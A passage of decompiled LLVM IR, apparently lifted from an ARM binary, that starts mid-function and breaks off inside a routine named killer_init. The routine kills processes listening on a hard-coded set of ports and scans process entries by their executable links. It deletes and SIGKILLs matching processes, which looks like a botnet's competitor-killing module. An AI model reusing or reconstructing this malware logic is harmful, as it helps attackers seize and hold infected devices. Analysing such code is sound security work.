  uselistorder i32 %v0_cb80, { 1, 0 }
  uselistorder i32 %v0_cb5c78, { 1, 0 }
  uselistorder i32 %v0_ce94, { 4, 3, 0, 1, 2 }
  uselistorder i32 %v0_cb8c83, { 1, 2, 0 }
  uselistorder i32 %v1_cb5c54, { 1, 0 }
  uselistorder i32 %v2_cb40, { 1, 0 }
  uselistorder i32 %v1_cb3c, { 3, 1, 0, 2, 4 }
  uselistorder i32 %v1_cafc, { 0, 2, 1 }
  uselistorder i32 %v0_cafc16, { 1, 0 }
  uselistorder i32 %v1_cac8, { 0, 2, 3, 4, 5, 6, 1 }
  uselistorder i32 %v2_ca58, { 1, 2, 0 }
  uselistorder i32 %v0_ca00, { 1, 0 }
  uselistorder i32 %v2_c9fc, { 1, 0, 2 }
  uselistorder i8* %v3_c9e4, { 1, 0, 2 }
  uselistorder i32 %v2_c9c4, { 1, 2, 3, 0, 4, 5 }
  uselistorder i8* %stack_var_-585, { 1, 4, 0, 2, 3 }
  uselistorder i8* %stack_var_-72, { 2, 0, 1 }
  uselistorder i32* %stack_var_-56, { 0, 1, 2, 4, 3 }
  uselistorder i32 (i8*, i32, i32)* @util_fdgets, { 1, 0 }
  uselistorder label %dec_label_pc_ceac, { 1, 0 }
  uselistorder label %dec_label_pc_ce80, { 1, 2, 0 }
  uselistorder label %dec_label_pc_ce60, { 1, 0 }
  uselistorder label %dec_label_pc_ce54, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_ce3c, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_cd4c, { 1, 0 }
  uselistorder label %dec_label_pc_cd4cthread-pre-split, { 1, 0 }
  uselistorder label %dec_label_pc_cd34.loopexit, { 1, 0 }
  uselistorder label %dec_label_pc_cc50, { 1, 0 }
  uselistorder label %dec_label_pc_cc50.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_cc40.loopexit, { 2, 1, 0 }
  uselistorder label %dec_label_pc_cbd8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_cb80, { 2, 0, 1 }
  uselistorder label %dec_label_pc_cb64, { 1, 0 }
  uselistorder label %dec_label_pc_cb08, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_ca6c.backedge, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_cabc, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_ca84, { 1, 0 }
  uselistorder label %dec_label_pc_ca28, { 1, 0 }
}

define i32 @killer_init(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-8384 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-192 = alloca i32, align 4
  %stack_var_-208 = alloca i32, align 4
  %stack_var_-128 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-4264 = alloca i32, align 4
  %v3_cf10 = load i32, i32* @r4, align 4
  %v6_cf10 = load i32, i32* @r5, align 4
  %v9_cf10 = load i32, i32* @r6, align 4
  %v12_cf10 = load i32, i32* @r7, align 4
  %v15_cf10 = load i32, i32* @r8, align 4
  %v18_cf10 = load i32, i32* @sb, align 4
  %v21_cf10 = load i32, i32* @sl, align 4
  %v24_cf10 = load i32, i32* @fp, align 4
  %v27_cf10 = load i32, i32* @lr, align 4
  %v2_cf20 = call i32 @__GI_time(i32* null)
  store i32 %v2_cf20, i32* @r7, align 4
  %v0_cf28 = call i32 @__libc_fork()
  %v7_cf2c = icmp eq i32 %v0_cf28, -1
  %. = zext i1 %v7_cf2c to i32
  %tmp125 = icmp slt i32 %v0_cf28, 1
  %storemerge96 = select i1 %tmp125, i32 %., i32 1
  store i32 %storemerge96, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_243dc.71 to i32), i32* %r3.global-to-local, align 4
  %v2_cf48 = icmp eq i32 %storemerge96, 0
  store i32 %v0_cf28, i32* @global_var_243dc.71, align 4
  br i1 %v2_cf48, label %dec_label_pc_cf64, label %dec_label_pc_cf54

dec_label_pc_cf54:                                ; preds = %dec_label_pc_d084, %dec_label_pc_cf64, %entry
  %v1_cf60 = phi i32 [ %v2_d01c, %dec_label_pc_cf64 ], [ %v0_cf28, %entry ], [ 0, %dec_label_pc_d084 ]
  store i32 %v3_cf10, i32* @r4, align 4
  store i32 %v6_cf10, i32* @r5, align 4
  store i32 %v9_cf10, i32* @r6, align 4
  store i32 %v12_cf10, i32* @r7, align 4
  store i32 %v15_cf10, i32* @r8, align 4
  store i32 %v18_cf10, i32* @sb, align 4
  store i32 %v21_cf10, i32* @sl, align 4
  store i32 %v24_cf10, i32* @fp, align 4
  store i32 %v27_cf10, i32* @lr, align 4
  ret i32 %v1_cf60

dec_label_pc_cf64:                                ; preds = %entry
  %v1_cf68 = call i32 @sleep(i32 5)
  store i32 4096, i32* @r0, align 4
  %v0_cf70 = call i32 @malloc()
  store i32 ptrtoint (i32* @global_var_218bc.73 to i32), i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_243d8.75 to i32), i32* %r1.global-to-local, align 4
  store i32 %v0_cf70, i32* %r2.global-to-local, align 4
  %v0_cf80 = load i32, i32* @r5, align 4
  %v1_cf80 = trunc i32 %v0_cf80 to i8
  %v3_cf80 = inttoptr i32 %v0_cf70 to i8*
  store i8 %v1_cf80, i8* %v3_cf80, align 1
  %v0_cf88 = load i32, i32* @r5, align 4
  %v1_cf88 = load i32, i32* %r3.global-to-local, align 4
  %v2_cf88 = inttoptr i32 %v1_cf88 to i32*
  store i32 %v0_cf88, i32* %v2_cf88, align 4
  %v0_cf8c = load i32, i32* %r2.global-to-local, align 4
  %v1_cf8c = load i32, i32* %r1.global-to-local, align 4
  %v2_cf8c = inttoptr i32 %v1_cf8c to i32*
  store i32 %v0_cf8c, i32* %v2_cf8c, align 4
  %v1_cf90 = call i32 @table_unlock_val(i32 13)
  %v1_cf98 = call i32 @table_unlock_val(i32 14)
  %v2_cfa0 = ptrtoint i32* %stack_var_-4264 to i32
  store i32 %v2_cfa0, i32* %r2.global-to-local, align 4
  %v0_cfa4 = load i32, i32* @r5, align 4
  store i32 %v0_cfa4, i32* %r1.global-to-local, align 4
  %v2_cfb0 = inttoptr i32 %v0_cfa4 to i32*
  %v3_cfb0 = call i32 @table_retrieve_val(i32 13, i32* %v2_cfb0)
  %v1_cfb8 = add i32 %v2_cfa0, -24
  store i32 %v1_cfb8, i32* %r3.global-to-local, align 4
  store i32 %v3_cfb0, i32* %r1.global-to-local, align 4
  store i32 %v1_cfb8, i32* @r0, align 4
  %v2_cfc8 = inttoptr i32 %v1_cfb8 to i8*
  %v3_cfc8 = call i32 @util_strcpy(i8* %v2_cfc8, i32 %v3_cfb0)
  store i32 %v1_cfb8, i32* %r1.global-to-local, align 4
  %v2_cfd0 = add i32 %v3_cfc8, %v1_cfb8
  store i32 %v2_cfd0, i32* @r4, align 4
  %v1_cfd4 = call i32 @__getpid(i32 %v3_cfc8)
  %v2_cfdc = ptrtoint i32* %stack_var_-64 to i32
  store i32 %v2_cfdc, i32* %r2.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v3_cfe4 = trunc i32 %v1_cfd4 to i8
  %v4_cfe4 = call i32 @util_itoa(i8 %v3_cfe4, i32 10, i32 %v2_cfdc)
  store i32 %v4_cfe4, i32* %r1.global-to-local, align 4
  %v0_cfec = load i32, i32* @r4, align 4
  store i32 %v0_cfec, i32* @r0, align 4
  %v2_cff0 = inttoptr i32 %v0_cfec to i8*
  %v3_cff0 = call i32 @util_strcpy(i8* %v2_cff0, i32 %v4_cfe4)
  %v0_cff4 = load i32, i32* @r5, align 4
  store i32 %v0_cff4, i32* %r1.global-to-local, align 4
  %v1_cff8 = load i32, i32* @r4, align 4
  %v2_cff8 = add i32 %v1_cff8, %v3_cff0
  store i32 %v2_cff8, i32* @r4, align 4
  %v2_d000 = inttoptr i32 %v0_cff4 to i32*
  %v3_d000 = call i32 @table_retrieve_val(i32 14, i32* %v2_d000)
  store i32 %v3_d000, i32* %r1.global-to-local, align 4
  %v0_d008 = load i32, i32* @r4, align 4
  store i32 %v0_d008, i32* @r0, align 4
  %v2_d00c = inttoptr i32 %v0_d008 to i8*
  %v3_d00c = call i32 @util_strcpy(i8* %v2_d00c, i32 %v3_d000)
  %v0_d010 = load i32, i32* @r5, align 4
  store i32 %v0_d010, i32* %r1.global-to-local, align 4
  store i32 %v3_d00c, i32* @r6, align 4
  %v2_d01c = call i32 @__libc_open(i32 %v1_cfb8, i32 %v0_d010)
  %v7_d020 = icmp eq i32 %v2_d01c, -1
  br i1 %v7_d020, label %dec_label_pc_cf54, label %dec_label_pc_d028

dec_label_pc_d028:                                ; preds = %dec_label_pc_cf64
  %v1_d028 = call i32 @__GI___libc_close(i32 %v2_d01c)
  %v1_d030 = call i32 @table_lock_val(i32 13)
  %v1_d038 = call i32 @table_lock_val(i32 14)
  store i32 ptrtoint (i32* @global_var_243d8.75 to i32), i32* %r3.global-to-local, align 4
  %v2_d044 = load i32, i32* @global_var_243d8.75, align 4
  store i32 %v2_d044, i32* %r1.global-to-local, align 4
  store i32 4095, i32* %r2.global-to-local, align 4
  %v3_d050 = call i32 @readlink(i32 %v1_cfb8, i32 %v2_d044, i32 4095)
  %v7_d054 = icmp eq i32 %v3_d050, -1
  br i1 %v7_d054, label %.thread9, label %bb128

bb128:                                            ; preds = %dec_label_pc_d028
  store i32 ptrtoint (i32* @global_var_243d8.75 to i32), i32* %r1.global-to-local, align 4
  %v3_d05c = load i32, i32* @global_var_243d8.75, align 4
  store i32 %v3_d05c, i32* %r3.global-to-local, align 4
  %v1_d060 = load i32, i32* @r5, align 4
  %v2_d060 = trunc i32 %v1_d060 to i8
  %v5_d060 = add i32 %v3_d05c, %v3_d050
  %v6_d060 = inttoptr i32 %v5_d060 to i8*
  store i8 %v2_d060, i8* %v6_d060, align 1
  br label %.thread9

.thread9:                                         ; preds = %dec_label_pc_d028, %bb128
  store i32 %v1_cfb8, i32* %r2.global-to-local, align 4
  %v0_d068 = load i32, i32* @r6, align 4
  %v1_d068 = load i32, i32* @r4, align 4
  %v1_cfb8.neg = sub i32 24, %v2_cfa0
  %v2_d068 = add i32 %v1_cfb8.neg, %v0_d068
  %v2_d06c = add i32 %v2_d068, %v1_d068
  store i32 %v2_d06c, i32* @r1, align 4
  store i32 %v1_cfb8, i32* @r0, align 4
  %v0_d074 = call i32 @util_zero()
  %v0_d078 = load i32, i32* @r7, align 4
  store i32 %v0_d078, i32* @r4, align 4
  %v0_d07c = load i32, i32* @r5, align 4
  store i32 400, i32* @r5, align 4
  %v2_d1e0 = ptrtoint i32* %stack_var_-128 to i32
  %v2_d1ec = bitcast i32* %stack_var_-128 to i8*
  %v2_d230 = ptrtoint i32* %stack_var_-192 to i32
  %v2_d234 = bitcast i32* %stack_var_-192 to i8*
  %v2_d380 = ptrtoint i32* %stack_var_-44 to i32
  %v2_d394 = ptrtoint i32* %stack_var_-48 to i32
  %v2_d3a8 = ptrtoint i32* %stack_var_-8384 to i32
  %v2_d3c4 = ptrtoint i32* %stack_var_-208 to i32
  br label %dec_label_pc_d084

dec_label_pc_d084:                                ; preds = %dec_label_pc_d1a8, %.thread9
  %stack_var_-8388.0 = phi i32 [ %v0_d07c, %.thread9 ], [ %stack_var_-8388.3, %dec_label_pc_d1a8 ]
  %v1_d088 = call i32 @table_unlock_val(i32 13)
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_d094 = call i32 @table_retrieve_val(i32 13, i32* null)
  %v1_d098 = call i32 @__GI_opendir(i32 %v3_d094)
  store i32 %v1_d098, i32* @sb, align 4
  %v2_d09c = icmp eq i32 %v1_d098, 0
  br i1 %v2_d09c, label %dec_label_pc_cf54, label %dec_label_pc_d0a4

dec_label_pc_d0a4:                                ; preds = %dec_label_pc_d084
  %v1_d0a8 = call i32 @table_lock_val(i32 13)
  %v1_d0b4 = call i32 @killer_kill_by_port(i32 58811)
  %v1_d0c0 = call i32 @killer_kill_by_port(i32 add (i32 ptrtoint (i32* @global_var_c700.76 to i32), i32 7))
  %v1_d0cc = call i32 @killer_kill_by_port(i32 14853)
  %v1_d0d4 = call i32 @killer_kill_by_port(i32 20480)
  %v1_d0e0 = call i32 @killer_kill_by_port(i32 47873)
  %v1_d0ec = call i32 @killer_kill_by_port(i32 57616)
  %v1_d0f8 = call i32 @killer_kill_by_port(i32 2842)
  %v1_d104 = call i32 @killer_kill_by_port(i32 10522)
  %v0_d10860 = load i32, i32* @sb, align 4
  %v1_d10c61 = inttoptr i32 %v0_d10860 to i32*
  %v2_d10c62 = call i32 @__GI_readdir(i32* %v1_d10c61)
  %v2_d11064 = icmp eq i32 %v2_d10c62, 0
  br i1 %v2_d11064, label %dec_label_pc_d1a8, label %dec_label_pc_d118.preheader

dec_label_pc_d118.preheader:                      ; preds = %dec_label_pc_d0a4, %dec_label_pc_d108.backedge
  %v0_d11872 = phi i32 [ %v2_d10c, %dec_label_pc_d108.backedge ], [ %v2_d10c62, %dec_label_pc_d0a4 ]
  %stack_var_-8388.165 = phi i32 [ %stack_var_-8388.1.be, %dec_label_pc_d108.backedge ], [ %stack_var_-8388.0, %dec_label_pc_d0a4 ]
  br label %dec_label_pc_d118

dec_label_pc_d118:                                ; preds = %dec_label_pc_d118.preheader, %dec_label_pc_d190
  %v0_d128 = phi i32 [ %v2_d19c, %dec_label_pc_d190 ], [ %v0_d11872, %dec_label_pc_d118.preheader ]
  %stack_var_-8388.2 = phi i32 [ %v1_d13c, %dec_label_pc_d190 ], [ %stack_var_-8388.165, %dec_label_pc_d118.preheader ]
  %v1_d118 = add i32 %v0_d128, 11
  %v2_d118 = inttoptr i32 %v1_d118 to i8*
  %v3_d118 = load i8, i8* %v2_d118, align 1
  %v4_d118 = zext i8 %v3_d118 to i32
  %v1_d11c = add nsw i32 %v4_d118, -48
  store i32 %v1_d11c, i32* %r3.global-to-local, align 4
  %tmp = icmp ugt i32 %v1_d11c, 9
  br i1 %tmp, label %dec_label_pc_d108.backedge, label %dec_label_pc_d128

dec_label_pc_d128:                                ; preds = %dec_label_pc_d118
  store i32 %v1_d118, i32* @r6, align 4
  store i32 %v1_d118, i32* @r0, align 4
  %v1_d130 = call i32 @atol(i32 %v1_d118)
  %v0_d138 = load i32, i32* @r5, align 4
  %v1_d13c = add i32 %stack_var_-8388.2, 1
  store i32 %v1_d13c, i32* %r3.global-to-local, align 4
  store i32 %v1_d130, i32* @r8, align 4
  %v5_d148 = icmp slt i32 %v0_d138, %v1_d130
  %v2_d1b8 = call i32 @__GI_time(i32* null)
  br i1 %v5_d148, label %dec_label_pc_d1b4, label %dec_label_pc_d14c

dec_label_pc_d14c:                                ; preds = %dec_label_pc_d128
  %v0_d154 = load i32, i32* @r4, align 4
  %v2_d154 = sub i32 %v2_d1b8, %v0_d154
  %v7_d15c = icmp slt i32 %v2_d154, 601
  br i1 %v7_d15c, label %dec_label_pc_d164, label %.thread10

.thread10:                                        ; preds = %dec_label_pc_d14c
  store i32 400, i32* @r5, align 4
  br label %dec_label_pc_d108.backedge

dec_label_pc_d164:                                ; preds = %dec_label_pc_d14c
  %v0_d164 = load i32, i32* @r8, align 4
  %v7_d168 = icmp slt i32 %v0_d164, 401
  br i1 %v7_d168, label %dec_label_pc_d108.backedge, label %dec_label_pc_d16c

dec_label_pc_d16c:                                ; preds = %dec_label_pc_d164
  %v3_d174 = zext i32 %v1_d13c to i64
  %v4_d174 = mul nuw i64 %v3_d174, 3435973837
  %v7_d174 = trunc i64 %v4_d174 to i32
  store i32 %v7_d174, i32* %r1.global-to-local, align 4
  %v3_d1781 = udiv i64 %v4_d174, 34359738368
  %v3_d17c3 = mul nuw nsw i64 %v3_d1781, 8
  %v3_d17c = trunc i64 %v3_d17c3 to i32
  store i32 %v3_d17c, i32* %r3.global-to-local, align 4
  %v2_d1805 = mul nuw nsw i64 %v3_d1781, 2
  %v2_d180 = trunc i64 %v2_d1805 to i32
  %v2_d184 = add i32 %v3_d17c, %v2_d180
  store i32 %v2_d184, i32* %r2.global-to-local, align 4
  %v9_d188 = icmp eq i32 %v1_d13c, %v2_d184
  br i1 %v9_d188, label %dec_label_pc_d190, label %dec_label_pc_d108.backedge

dec_label_pc_d190:                                ; preds = %dec_label_pc_d16c
  %v1_d194 = call i32 @sleep(i32 1)
  %v0_d198 = load i32, i32* @sb, align 4
  %v1_d19c = inttoptr i32 %v0_d198 to i32*
  %v2_d19c = call i32 @__GI_readdir(i32* %v1_d19c)
  %v2_d1a0 = icmp eq i32 %v2_d19c, 0
  br i1 %v2_d1a0, label %dec_label_pc_d1a8, label %dec_label_pc_d118

dec_label_pc_d1a8:                                ; preds = %dec_label_pc_d108.backedge, %dec_label_pc_d190, %dec_label_pc_d0a4
  %stack_var_-8388.3 = phi i32 [ %stack_var_-8388.0, %dec_label_pc_d0a4 ], [ %v1_d13c, %dec_label_pc_d190 ], [ %stack_var_-8388.1.be, %dec_label_pc_d108.backedge ]
  %v0_d1a8 = load i32, i32* @sb, align 4
  %v1_d1ac = inttoptr i32 %v0_d1a8 to i32*
  %v2_d1ac = call i32 @__GI_closedir(i32* %v1_d1ac)
  br label %dec_label_pc_d084

dec_label_pc_d1b4:                                ; preds = %dec_label_pc_d128
  %v1_d1c4 = call i32 @table_unlock_val(i32 13)
  %v1_d1cc = call i32 @table_unlock_val(i32 14)
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_d1d8 = call i32 @table_retrieve_val(i32 13, i32* null)
  store i32 %v2_d1e0, i32* @fp, align 4
  store i32 %v3_d1d8, i32* %r1.global-to-local, align 4
  store i32 %v2_d1e0, i32* @r0, align 4
  %v3_d1ec = call i32 @util_strcpy(i8* %v2_d1ec, i32 %v3_d1d8)
  %v1_d1f0 = load i32, i32* @fp, align 4
  %v2_d1f0 = add i32 %v1_d1f0, %v3_d1ec
  store i32 %v2_d1f0, i32* %r5.global-to-local, align 4
  %v0_d1f4 = load i32, i32* @r6, align 4
  store i32 %v0_d1f4, i32* %r1.global-to-local, align 4
  store i32 %v2_d1f0, i32* @r0, align 4
  %v2_d1fc = inttoptr i32 %v2_d1f0 to i8*
  %v3_d1fc = call i32 @util_strcpy(i8* %v2_d1fc, i32 %v0_d1f4)
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_d20c = call i32 @table_retrieve_val(i32 14, i32* null)
  store i32 %v3_d20c, i32* %r1.global-to-local, align 4
  %v1_d214 = load i32, i32* %r5.global-to-local, align 4
  %v2_d214 = add i32 %v1_d214, %v3_d1fc
  store i32 %v2_d214, i32* @r0, align 4
  %v2_d218 = inttoptr i32 %v2_d214 to i8*
  %v3_d218 = call i32 @util_strcpy(i8* %v2_d218, i32 %v3_d20c)
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_d224 = call i32 @table_retrieve_val(i32 13, i32* null)
  store i32 %v3_d224, i32* %r1.global-to-local, align 4
  store i32 %v2_d230, i32* @r0, align 4
  %v3_d234 = call i32 @util_strcpy(i8* %v2_d234, i32 %v3_d224)
  store i32 %v2_d230, i32* %r2.global-to-local, align 4
  %v2_d240 = add i32 %v3_d234, %v2_d230
  store i32 %v2_d240, i32* @r5, align 4
  %v0_d244 = load i32, i32* @r6, align 4
  store i32 %v0_d244, i32* %r1.global-to-local, align 4
  store i32 %v2_d240, i32* @r0, align 4
  %v2_d24c = inttoptr i32 %v2_d240 to i8*
  %v3_d24c = call i32 @util_strcpy(i8* %v2_d24c, i32 %v0_d244)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v3_d24c, i32* @r4, align 4
  %v3_d25c = call i32 @table_retrieve_val(i32 29, i32* null)
  store i32 %v3_d25c, i32* %r1.global-to-local, align 4
  %v0_d264 = load i32, i32* @r4, align 4
  %v1_d264 = load i32, i32* @r5, align 4
  %v2_d264 = add i32 %v1_d264, %v0_d264
  store i32 %v2_d264, i32* @r0, align 4
  %v2_d268 = inttoptr i32 %v2_d264 to i8*
  %v3_d268 = call i32 @util_strcpy(i8* %v2_d268, i32 %v3_d25c)
  %v1_d270 = call i32 @table_lock_val(i32 13)
  %v1_d278 = call i32 @table_lock_val(i32 14)
  store i32 %v1_cfb8, i32* %r1.global-to-local, align 4
  store i32 4095, i32* %r2.global-to-local, align 4
  %v3_d28c = call i32 @readlink(i32 %v2_d1e0, i32 %v1_cfb8, i32 4095)
  %v7_d290 = icmp eq i32 %v3_d28c, -1
  store i32 %v3_d28c, i32* @r5, align 4
  br i1 %v7_d290, label %dec_label_pc_d354, label %dec_label_pc_d29c

dec_label_pc_d29c:                                ; preds = %dec_label_pc_d1b4
  store i32 %v1_cfb8, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v4_d2a4 = add i32 %v3_d28c, %v1_cfb8
  %v5_d2a4 = inttoptr i32 %v4_d2a4 to i8*
  store i8 0, i8* %v5_d2a4, align 1
  %v1_d2ac = call i32 @table_unlock_val(i32 30)
  %v0_d2b0 = load i32, i32* @r4, align 4
  store i32 %v0_d2b0, i32* %r1.global-to-local, align 4
  %v2_d2b8 = inttoptr i32 %v0_d2b0 to i32*
  %v3_d2b8 = call i32 @table_retrieve_val(i32 30, i32* %v2_d2b8)
  %v0_d2bc = load i32, i32* @r5, align 4
  %v1_d2bc = add i32 %v0_d2bc, -1
  store i32 %v1_d2bc, i32* @r1, align 4
  store i32 %v3_d2b8, i32* %r2.global-to-local, align 4
  %v4_d2c8 = call i32 @util_stristr(i8* %v2_cfc8, i32 %v1_d2bc, i32 %v3_d2b8)
  %v7_d2cc = icmp eq i32 %v4_d2c8, -1
  br i1 %v7_d2cc, label %dec_label_pc_d2e8, label %dec_label_pc_d2d4

dec_label_pc_d2d4:                                ; preds = %dec_label_pc_d29c
  %v1_d2d8 = call i32 @unlink(i32 %v1_cfb8)
  %v0_d2dc = load i32, i32* @r8, align 4
  store i32 9, i32* %r1.global-to-local, align 4
  %v2_d2e4 = call i32 @kill(i32 %v0_d2dc, i32 9)
  br label %dec_label_pc_d2e8

dec_label_pc_d2e8:                                ; preds = %dec_label_pc_d29c, %dec_label_pc_d2d4
  %v1_d2ec = call i32 @table_lock_val(i32 30)
  %v1_d2f0 = call i32 @__getpid(i32 %v1_d2ec)
  store i32 %v1_d2f0, i32* @r0, align 4
  %v1_d2f4 = load i32, i32* @r8, align 4
  %v9_d2f4 = icmp eq i32 %v1_d2f0, %v1_d2f4
  br i1 %v9_d2f4, label %dec_label_pc_d320, label %dec_label_pc_d2fc

dec_label_pc_d2fc:                                ; preds = %dec_label_pc_d2e8
  %v0_d2fc = call i32 @getppid()
  %v1_d300 = load i32, i32* @r8, align 4
  %v9_d300 = icmp eq i32 %v0_d2fc, %v1_d300
  br i1 %v9_d300, label %dec_label_pc_d320, label %dec_label_pc_d308

dec_label_pc_d308:                                ; preds = %dec_label_pc_d2fc
  store i32 ptrtoint (i32* @global_var_243d8.75 to i32), i32* %r2.global-to-local, align 4
  %v2_d310 = load i32, i32* @global_var_243d8.75, align 4
  store i32 %v2_d310, i32* %r1.global-to-local, align 4
  %v4_d314 = call i32 @util_strcmp(i8* %v2_cfc8, i32 %v2_d310, i32 ptrtoint (i32* @global_var_243d8.75 to i32))
  %v2_d318 = icmp eq i32 %v4_d314, 0
  br i1 %v2_d318, label %dec_label_pc_d32c, label %dec_label_pc_d308.dec_label_pc_d320_crit_edge

dec_label_pc_d308.dec_label_pc_d320_crit_edge:    ; preds = %dec_label_pc_d308
  %v0_d324.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_d320

dec_label_pc_d320:                                ; preds = %dec_label_pc_d308.dec_label_pc_d320_crit_edge, %dec_label_pc_d2fc, %dec_label_pc_d2e8
  %v0_d324 = phi i32 [ %v0_d324.pre, %dec_label_pc_d308.dec_label_pc_d320_crit_edge ], [ %v0_d2fc, %dec_label_pc_d2fc ], [ %v1_d2f0, %dec_label_pc_d2e8 ]
  store i32 %v2_d1b8, i32* @r4, align 4
  store i32 %v0_d324, i32* @r5, align 4
  br label %dec_label_pc_d108.backedge

dec_label_pc_d108.backedge:                       ; preds = %dec_label_pc_d16c, %dec_label_pc_d164, %dec_label_pc_d118, %dec_label_pc_d320, %dec_label_pc_d480, %.thread10
  %stack_var_-8388.1.be = phi i32 [ %v1_d13c, %dec_label_pc_d480 ], [ %v1_d13c, %dec_label_pc_d320 ], [ %v1_d13c, %.thread10 ], [ %stack_var_-8388.2, %dec_label_pc_d118 ], [ %v1_d13c, %dec_label_pc_d164 ], [ %v1_d13c, %dec_label_pc_d16c ]
  %v0_d108 = load i32, i32* @sb, align 4
  %v1_d10c = inttoptr i32 %v0_d108 to i32*
  %v2_d10c = call i32 @__GI_readdir(i32* %v1_d10c)
  %v2_d110 = icmp eq i32 %v2_d10c, 0
  br i1 %v2_d110, label %dec_label_pc_d1a8, label %dec_label_pc_d118.preheader

dec_label_pc_d32c:                                ; preds = %dec_label_pc_d308
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_d334 = call i32 @__libc_open(i32 %v1_cfb8, i32 0)
  %v7_d338 = icmp eq i32 %v2_d334, -1
  store i32 %v2_d334, i32* @r4, align 4
  br i1 %v7_d338, label %bb129, label %.thread12

bb129:                                            ; preds = %dec_label_pc_d32c
  store i32 9, i32* @r1, align 4
  br label %.thread12

.thread12:                                        ; preds = %dec_label_pc_d32c, %bb129
  store i32 ptrtoint (i32* @global_var_d34c.79 to i32), i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v7_d338, i32 ptrtoint (i32* @global_var_109e8.78 to i32))
  %v0_d34c = load i32, i32* @r4, align 4
  %v1_d350 = call i32 @__GI___libc_close(i32 %v0_d34c)
  br label %dec_label_pc_d354

dec_label_pc_d354:                                ; preds = %dec_label_pc_d1b4, %.thread12
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_d35c = call i32 @__libc_open(i32 %v2_d1e0, i32 0)
  %v7_d360 = icmp eq i32 %v2_d35c, -1
  store i32 %v2_d35c, i32* @sl, align 4
  br i1 %v7_d360, label %dec_label_pc_d480, label %dec_label_pc_d36c

dec_label_pc_d36c:                                ; preds = %dec_label_pc_d354
  %v1_d370 = call i32 @table_unlock_val(i32 18)
  %v1_d378 = call i32 @table_unlock_val(i32 19)
  store i32 %v2_d380, i32* %r1.global-to-local, align 4
  %v3_d388 = call i32 @table_retrieve_val(i32 18, i32* nonnull %stack_var_-44)
  store i32 %v3_d388, i32* @r6, align 4
  store i32 %v2_d394, i32* %r1.global-to-local, align 4
  %v3_d39c = call i32 @table_retrieve_val(i32 19, i32* nonnull %stack_var_-48)
  store i32 %v3_d39c, i32* @r7, align 4
  store i32 %v2_d3a8, i32* @r4, align 4
  %v0_d3ac56 = load i32, i32* @sl, align 4
  store i32 %v2_d3a8, i32* @r1, align 4
  store i32 4096, i32* @r2, align 4
  %v1_d3b857 = call i32 @__libc_read(i32 %v0_d3ac56)
  %tmp130 = icmp slt i32 %v1_d3b857, 1
  br i1 %tmp130, label %dec_label_pc_d4b0, label %dec_label_pc_d3c4

dec_label_pc_d3c4:                                ; preds = %dec_label_pc_d36c, %dec_label_pc_d3ac.backedge
  %v0_d3f847 = phi i32 [ %v1_d3b8, %dec_label_pc_d3ac.backedge ], [ %v1_d3b857, %dec_label_pc_d36c ]
  store i32 %v2_d3c4, i32* @r3, align 4
  %v3_d3c8 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_d3c8, i32* @r5, align 4
  %v5_d3d0 = icmp slt i32 %v0_d3f847, %v3_d3c8
  br i1 %v5_d3d0, label %dec_label_pc_d3e0, label %dec_label_pc_d434.lr.ph

dec_label_pc_d434.lr.ph:                          ; preds = %dec_label_pc_d3c4
  %v1_d42c39 = add i32 %v0_d3f847, -1
  store i32 %v1_d42c39, i32* %r1.global-to-local, align 4
  %v0_d434.pre = load i32, i32* @r6, align 4
  %v1_d438.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_d434

dec_label_pc_d3e0:                                ; preds = %dec_label_pc_d42c.backedge, %dec_label_pc_d3c4
  store i32 %v2_d3c4, i32* %r1.global-to-local, align 4
  %v3_d3e4 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_d3e4, i32* @lr, align 4
  %v5_d3ec = icmp slt i32 %v0_d3f847, %v3_d3e4
  br i1 %v5_d3ec, label %dec_label_pc_d3ac.backedge, label %.thread25

dec_label_pc_d3ac.backedge:                       ; preds = %dec_label_pc_d414, %.thread25, %dec_label_pc_d3e0
  %v0_d3ac = load i32, i32* @sl, align 4
  store i32 %v2_d3a8, i32* @r1, align 4
  store i32 4096, i32* @r2, align 4
  %v1_d3b8 = call i32 @__libc_read(i32 %v0_d3ac)
  %tmp131 = icmp slt i32 %v1_d3b8, 1
  br i1 %tmp131, label %dec_label_pc_d4b0, label %dec_label_pc_d3c4

.thread25:                                        ; preds = %dec_label_pc_d3e0
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_d3f849 = icmp eq i32 %v0_d3f847, 0
  br i1 %v2_d3f849, label %dec_label_pc_d3ac.backedge, label %dec_label_pc_d400.lr.ph

dec_label_pc_d400.lr.ph:                          ; preds = %.thread25
  %v0_d400.pre = load i32, i32* @r7, align 4
  %v1_d404.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_d400

dec_label_pc_d400:                                ; preds = %dec_label_pc_d414, %dec_label_pc_d400.lr.ph
  %v0_d3f8.in = phi i32 [ %v0_d3f847, %dec_label_pc_d400.lr.ph ], [ %v0_d3f8, %dec_label_pc_d414 ]
